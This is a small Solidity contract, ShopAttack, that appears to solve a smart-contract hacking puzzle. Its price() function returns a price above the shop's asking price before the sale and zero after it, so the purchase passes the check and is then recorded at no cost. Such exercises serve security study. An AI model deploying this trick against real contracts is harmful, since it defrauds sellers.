// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint) {
        if (!shop.isSold()) {
            uint p = shop.price() + 1;
            return p;
        } else {
            return 0;
        }
    }

    function buy() public {
        shop.buy();
    }

}